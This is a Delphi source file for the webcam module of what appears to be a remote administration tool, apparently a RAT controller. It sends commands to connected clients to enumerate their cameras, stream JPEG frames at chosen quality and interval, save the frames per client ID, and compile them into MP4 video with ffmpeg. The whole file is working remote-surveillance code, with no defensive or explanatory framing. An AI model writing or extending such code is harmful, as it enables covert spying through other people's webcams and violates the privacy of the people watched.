unit UnitWebcam;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, ToolWin, acPNG, ExtCtrls, acImage, jpeg, UnitMain,
  SocketUnitEx, UnitCommands, UnitRepository, UnitFunctions, UnitVariables,
  UnitConstants, UnitManager, uJSONConfig;

type
  TFormWebcam = class(TForm)
    tlb1: TToolBar;
    btn1: TToolButton;
    btn4: TToolButton;
    img1: TImage;
    cbb1: TComboBoxEx;
    btn5: TToolButton;
    pnl1: TPanel;
    lbl1: TLabel;
    lbl2: TLabel;
    trckbr1: TTrackBar;
    trckbr2: TTrackBar;
    btn6: TToolButton;
    rg1: TRadioGroup;
    chk1: TCheckBox;
    lbl6: TLabel;
    lbl5: TLabel;
    grp1: TGroupBox;
    rb1: TRadioButton;
    rb2: TRadioButton;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormShow(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure btn5Click(Sender: TObject);
    procedure btn6Click(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure trckbr1Change(Sender: TObject);
    procedure trckbr2Change(Sender: TObject);
    procedure chk1Click(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: TClientDatas;
    LastQuality, LastInterval,
    LastImgW, LastImgH: Integer;
    procedure AddLog(Log: string);
    procedure AddSentLog(Log: string);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
    procedure CalcInvertedImage(BM1, Inv: TBitmap);
    procedure CalcGrayScaleImage(BM1, Gray: TBitmap);
  public
    { Public declarations }                  
    constructor Create(aOwner: TComponent; _Client: TClientDatas);   
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormWebcam: TFormWebcam;

implementation

{$R *.dfm}
                
constructor TFormWebcam.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;
                 
procedure TFormWebcam.AddLog(Log: string);
begin                                   
  if Client.Forms[16] = nil then Exit;
  TFormManager(Client.Forms[16]).AddLog('[INFO]', Log, -1, clBlack);
end;

procedure TFormWebcam.AddSentLog(Log: string);
begin
  if Client.Forms[16] = nil then Exit;
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormWebcam.AddRecvLog(Log: string; lColor: TColor);
begin        
  if Client.Forms[16] = nil then Exit;
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormWebcam.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormWebcam.FormClose(Sender: TObject; var Action: TCloseAction);
var
  JSONConfig: TJSONConfig;
begin
  if btn1.Down = True then
  begin
    btn1.Down := False;
    btn1.Click;
  end;     

  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteInteger('Webcam width', Width);
  JSONConfig.WriteInteger('Webcam height', Height);
  JSONConfig.WriteInteger('Webcam left', Left);
  JSONConfig.WriteInteger('Webcam top', Top);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

procedure TFormWebcam.FormShow(Sender: TObject);
begin
  if cbb1.Items.Count > 0 then Exit;
  Client.SendDatas(WEBCAMDRIVERS + '|');
  AddSentLog('Get webcam drivers');
end;

// From www.delphibasics.info -> DirectXDelphiWebcamCapture
//-----
procedure TFormWebcam.CalcInvertedImage(BM1, Inv: TBitmap);
var
  x, y: Integer;
  p1, d: PByteArray;
begin
  Inv.Width := BM1.Width;
  Inv.Height := BM1.Height;
  Inv.PixelFormat := pf24bit;

  for y := BM1.Height-1 downto 0 do
  begin
    p1 := BM1.ScanLine[y];
    d := Inv.ScanLine[y];
    for x := 0 to (BM1.Width * 3) - 1 do d^[x] := 255 - p1^[x];
  end;
end;
       
procedure TFormWebcam.CalcGrayScaleImage(BM1, Gray: TBitmap);
VAR
  X, Y, i: Integer;
  p1, d: PByteArray;
  g: Byte;
begin
  Gray.Width := BM1.Width;
  Gray.Height := BM1.Height;
  Gray.PixelFormat := pf24bit;

  for y := BM1.Height-1 downto 0 do
  begin
    p1 := BM1.ScanLine[Y];
    d := Gray.ScanLine[Y];
    i := 0;
    for x := 0 to BM1.Width - 1 do
    begin
      g := ((p1^[i]*100) + (p1^[i+1]*128) + (p1^[i+2]*28)) shr 8;
      d^[i] := g;
      Inc(i);
      d^[i] := g;
      Inc(i);
      d^[i] := g;
      Inc(i);
    end;
  end;
end;
//-----

procedure TFormWebcam.WndProc(var Msg: TMessage);
var
  MainCommand, Datas: string;
  Stream: TMemoryStream;
  Jpg: TJPEGImage;
  Bmp, TmpBmp: TBitmap;
  TmpStr: string;
begin
  inherited;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin
    Datas := string(Msg.WParam);
    MainCommand := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if MainCommand = WEBCAMDRIVERS then
    begin
      if Datas = '' then
      begin
        AddRecvLog('Webcam drivers not found', clRed);
        Exit;
      end;

      cbb1.Clear;
      while Datas <> '' do
      begin
        Application.ProcessMessages;
        TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
        Delete(Datas, 1, Pos('|', Datas));
        cbb1.Items.Add(TmpStr);
      end;

      cbb1.ItemIndex := 0;
      AddRecvLog(IntToStr(cbb1.Items.Count) + ' webcam drivers found');
    end
    else

    if MainCommand = WEBCAMCAPTURESTART then
    begin
      if Datas = '' then
      begin
        AddRecvLog('Empty webcam image of size ' + FileSizeToStr(Length(Datas)), clRed);
        Exit;
      end;

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;

      AddRecvLog('Webcam image stream of size ' + FileSizeToStr(Stream.Size));

      try
        Jpg := TJPEGImage.Create;
        Jpg.LoadFromStream(Stream);
        Stream.Free;
        TmpBmp := TBitmap.Create;
        TmpBmp.Assign(Jpg);
        Jpg.Free;
      except
        Stream.Free;
        Jpg.Free;
        TmpBmp.Free;
        Exit;
      end;

      if btn4.Down then
      begin
        TmpStr := GetWebcamFolder(Client.UserId) + '\' + MyGetDate('-');
        if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
        TmpBmp.SaveToFile(TmpStr + '\' + _MyGetTime('_') + '.bmp');
      end;

      Bmp := TBitmap.Create;

      case rg1.ItemIndex of
        0: Bmp.Assign(TmpBmp);
        1: CalcInvertedImage(TmpBmp, Bmp);
        2: CalcGrayScaleImage(TmpBmp, Bmp);
      end;
    
      TmpBmp.Free;

      if not chk1.Checked then img1.Canvas.Draw(0, 0, Bmp) else
      begin
        if rb1.Checked then img1.Canvas.CopyRect(Rect(0, 0, Bmp.Width, Bmp.height), Bmp.Canvas,
          Rect(Bmp.Width - 1, 0, 0, Bmp.height));
        if rb2.Checked then img1.Canvas.CopyRect(Rect(Bmp.Width, Bmp.height, 0, 0), Bmp.Canvas,
          Rect(Bmp.Width - 1, 0, 0, Bmp.height));
      end;

      Bmp.Free;

      Application.ProcessMessages;
      if btn1.Down = False then Exit;

      if (LastQuality <> trckbr1.Position) or (LastInterval <> trckbr2.Position) then
      begin
        LastQuality := trckbr1.Position;
        LastInterval := trckbr2.Position;
        Client.SendDatas(WEBCAMSETTINGS + '|' + IntToStr(LastQuality) + '|' +
         IntToStr(img1.Width) + '|' + IntToStr(img1.Height) + '|' +  IntToStr(LastInterval));
      end;
    end;
  end
  else

  if Msg.Msg = WM_EXITSIZEMOVE then
  begin
    if btn1.Down = False then Exit;

    if (LastImgW <> img1.Width) or (LastImgH <> img1.Height) then
    begin
      LastImgW := img1.Width;
      LastImgH := img1.Height;
      Client.SendDatas(WEBCAMSETTINGS + '|' + IntToStr(trckbr1.Position) + '|' +
        IntToStr(LastImgW) + '|' + IntToStr(LastImgH) + '|' +  IntToStr(trckbr2.Position));
    end;
  end
  else

  if Msg.Msg = WM_MOVE then Application.ProcessMessages;
end;

procedure TFormWebcam.btn1Click(Sender: TObject);
var
  i: Integer;
begin
  if btn1.Down = True then
  begin
    i := cbb1.ItemIndex;
    if i = -1 then
    begin
      btn1.Down := False;
      MessageBox(Handle, 'No webcam driver selected', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    LastQuality := trckbr1.Position;
    LastInterval := trckbr2.Position;
    LastImgW := img1.Width;
    LastImgH := img1.Height;
    Client.SendDatas(WEBCAMCAPTURESTART + '|' + IntToStr(i) + '|' +
      IntToStr(LastQuality) + '|' + IntToStr(LastImgW) + '|' +
      IntToStr(LastImgH) + '|' + IntToStr(LastInterval));
    AddSentLog('Start webcam capture on device ' + cbb1.Items.Strings[i]);
  end
  else
  begin
    Client.SendDatas(WEBCAMCAPTURESTOP + '|');
    AddSentLog('Stop webcam capture');
  end;
end;

procedure TFormWebcam.btn5Click(Sender: TObject);
begin
  if pnl1.Visible = False then pnl1.Visible := True else pnl1.Visible := False;
end;
           
function ListFrames(Path: string; var i: Integer): TStringArray;
var
  SchRec: TSearchRec;
begin
  Path := Path + '\';
  if FindFirst(Path + '*.*', faAnyFile, SchRec) <> 0 then Exit;
  
  i := 0;
  repeat
    if (SchRec.Attr and faDirectory) = faDirectory then Continue;
    Result[i] := Path + SchRec.Name;
    Inc(i);
  until FindNext(SchRec) <> 0;
  FindClose(SchRec);
end;

procedure TFormWebcam.btn6Click(Sender: TObject);
var
  MpegFile, FrameFolder,
  RecordFolder, TmpStr: string;
  TmpList: TStringArray;
  i, j: Integer; 
  Bmp: TBitmap;
begin
  if btn1.Down = True then Exit;

  FrameFolder := GetWebcamFolder(Client.UserId) + '\' + MyGetDate('-');
  if not DirectoryExists(FrameFolder) then 
  begin
    MessageBox(Handle, 'No saved frames found.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  MpegFile := ExtractFilePath(ParamStr(0)) + 'Resources\ffmpeg\ffmpeg.exe';
  if not FileExists(MpegFile) then
  begin
    MessageBox(Handle, PChar('File "' + MpegFile + '" not found.'), PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  btn6.Enabled := False;
  Cursor := crHourGlass;

  RecordFolder := FrameFolder + '\Records';
  if not DirectoryExists(RecordFolder) then CreateDirectory(PChar(RecordFolder), nil);
                          
  TmpList := ListFrames(FrameFolder, i);
  if not DirectoryExists(RecordFolder + '\_Temp') then CreateDir(RecordFolder + '\_Temp');

  for j := 0 to i - 1 do
  begin
    Bmp := TBitmap.Create;
    Bmp.LoadFromFile(TmpList[j]);
    Bmp.SaveToFile(RecordFolder + '\_Temp\00' + IntToStr(j + 1) + '.bmp');
    Bmp.Free;
  end;

  TmpList := ListFrames(RecordFolder + '\_Temp', i);

  for j := 0 to i - 1 do
  begin
    TmpStr := ExtractFileName(TmpList[j]);

    case Length(TmpStr) of
      8: Delete(TmpStr, 1, 1);
      9: Delete(TmpStr, 1, 2);
    end;

    RenameFile(TmpList[j], ExtractFilePath(TmpList[j]) + TmpStr);
  end;

  TmpStr := RecordFolder + '\' + MyGetTime('_') + '.mp4';
  ExecAndWait('"' + MpegFile + '" -framerate 2.5 -i "' + RecordFolder + '\_Temp\%03d.bmp" ' +
    '-c:v libx264 -vf fps=30 -s 480x360 -pix_fmt yuv420p -y "' + TmpStr + '"');

  if FileExists(TmpStr) = True then
    MessageBox(Handle, 'Saved frames recorded succesfully!', PROGRAMINFOS, MB_ICONINFORMATION)
  else MessageBox(Handle, 'Failed to record saved frames.', PROGRAMINFOS, MB_ICONERROR);

  DeleteAllFilesAndDir(RecordFolder + '\_Temp');
  btn6.Enabled := True;
  Cursor := crDefault;
end;

procedure TFormWebcam.btn4Click(Sender: TObject);
begin
  if btn4.Down then AddLog('Started saving received frames') else
    AddLog('Stopped saving received frames');
end;

procedure TFormWebcam.FormCreate(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  i: Integer;
begin
  //Load window position settings
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  i := JSONConfig.ReadInteger('Webcam width');
  if i <= 0 then Width := 330 else Width := i;
  i := JSONConfig.ReadInteger('Webcam height');
  if i <= 0 then Height := 327 else Height := i;
  i := JSONConfig.ReadInteger('Webcam left');
  if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
  i := JSONConfig.ReadInteger('Webcam top');
  if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
  JSONConfig.Free;
end;

procedure TFormWebcam.trckbr1Change(Sender: TObject);
begin
  lbl5.Caption := IntToStr(trckbr1.Position) + '%';
end;

procedure TFormWebcam.trckbr2Change(Sender: TObject);
begin
  lbl6.Caption := IntToStr(trckbr2.Position) + 'ms';
end;

procedure TFormWebcam.chk1Click(Sender: TObject);
begin
  rb1.Enabled := chk1.Checked;
  rb2.Enabled := chk1.Checked;
end;

end.
